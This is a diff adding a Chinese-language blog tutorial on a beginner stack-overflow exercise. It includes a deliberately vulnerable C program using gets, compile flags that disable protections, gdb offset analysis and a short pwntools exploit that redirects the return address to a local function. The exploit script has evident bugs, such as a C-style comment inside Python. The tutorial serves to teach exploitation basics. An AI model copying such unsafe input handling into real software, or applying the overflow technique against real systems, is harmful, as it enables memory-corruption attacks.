@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>stack_test - Dark&amp;Lord</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">Dark&amp;Lord</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">stack_test</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1662451599341"
+                  >2022-09-06 16:06</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1662451608741"
+                  >2022-09-06 16:06</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><p>栈溢出简单题目</p>
+<div><pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+
+<span class="hljs-comment">//compile options --to disable all protect</span>
+<span class="hljs-comment">//gcc -no-pie -fno-stack-protector -z execstack stack_test.c -o stack_test</span>
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">pwn</span><span class="hljs-params">()</span> 
+{ 
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Stack Overflow!"</span>); 
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">vulnerable</span><span class="hljs-params">()</span> 
+{
+    <span class="hljs-type">char</span> s[<span class="hljs-number">12</span>];
+    gets(s);
+    <span class="hljs-built_in">puts</span>(s);
+    <span class="hljs-keyword">return</span>;
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> 
+{
+    vulnerable();
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre></div>
+<p>以下为编译选项（关闭所有保护）：</p>
+<div><pre class="hljs"><code><span class="hljs-attribute">gcc</span> -<span class="hljs-literal">no</span>-pie -fno-stack-protector -z execstack stack_test.c -o stack_test</code></pre></div>
+<div><pre class="hljs"><code>└─# checksec --<span class="hljs-keyword">file</span>=./stack_test                      
+RELRO           <span class="hljs-keyword">STACK</span> CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable <span class="hljs-keyword">FILE</span>
+Partial RELRO   <span class="hljs-keyword">No</span> canary found   NX disabled   <span class="hljs-keyword">No</span> PIE          <span class="hljs-keyword">No</span> RPATH   <span class="hljs-keyword">No</span> RUNPATH   41 Symbols        <span class="hljs-keyword">No</span>    0               1  ./stack_test</code></pre></div>
+<p>分析源码，main函数调用vulnerable函数，vulnerable函数功能为获取用户输入并打印</p>
+<p>可见输入函数并对输入进行长度限制，可以考虑在输入点进行溢出操作，从而修改返回地址，让其指向溢出数据中的一段指令(shellcode)</p>
+<p>接下来使用gdb分析编译出的elf文件</p>
+<p><strong>我们的目的是对vulnerable函数中的gets输入点进行数据溢出，从而修改其return返回值为pwn()函数，达到执行pwn函数的目的</strong></p>
+<p><strong>首先找到vulnerable函数中gets获取的变量s的段内偏移地址：</strong></p>
+<p><strong><img src="/_resources/a898287adeb84577b0054c5f5a995246.png" alt="690a194ff230444007887547e4514e77.png" width="1023" height="689" class="jop-noMdConv" /></strong></p>
+<p>如上图所示，gets函数下一行即为s变量的段内偏移地址为[rbp-0xc]，0xc转化为十进制即为12,所以s变量的偏移长度为12,即距离段基地质长度为12</p>
+<p><strong>由于该elf文件为64位，在堆栈上占8个字节，32位则是4个字节</strong></p>
+<p>故而溢出数据的长度为12+8（其中12是s变量到ret返回地址的长度，8是为了覆盖段基地质），总的20字节可以使得数据溢出刚好与返回地址持平，再加上一段想要执行的地址，便可以使得返回地址返回为目标地址</p>
+<p><strong>接下来查看pwn函数的地址</strong></p>
+<p><strong><img src="/_resources/fa1c83afdede4d7188c0617206cfa656.png" alt="3226470517ad7646f109bb58750be083.png" width="1024" height="268" class="jop-noMdConv" /></strong></p>
+<p>由上图可以看到，pwn函数的起始地址为0x401136</p>
+<hr />
+<p><strong>PS:</strong></p>
+<p><strong>一般操作系统都是小端序，而通讯协议是大端序,如高位是0x88,低位是0x66</strong></p>
+<p><strong>大端序：</strong></p>
+<p><strong>就是我们日常使用的，高位字节在前，低位字节在后，如0x8866</strong></p>
+<p><strong>小端序：</strong></p>
+<p><strong>刚好与大端序相反，低位字节在前，高位字节在后，如0x6688</strong></p>
+<hr />
+<p>所以，exp代码如下：</p>
+<div><pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+key=p32(<span class="hljs-number">0x401136</span>)//自行编译elf文件的pwn函数的地址可能不同
+
+conn  = process(<span class="hljs-string">"./stack_test"</span>)
+
+conn.sendline(<span class="hljs-built_in">bytes</span>(<span class="hljs-string">'a'</span>,encoding=<span class="hljs-string">'utf8'</span>)*<span class="hljs-number">20</span>+key)
+
+<span class="hljs-built_in">print</span> (conn.recvall())</code></pre></div>
+<p>执行exp代码可得到：</p>
+<p><img src="/_resources/91f0e7919c5947f1972df859d8e9e521.png" /></p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
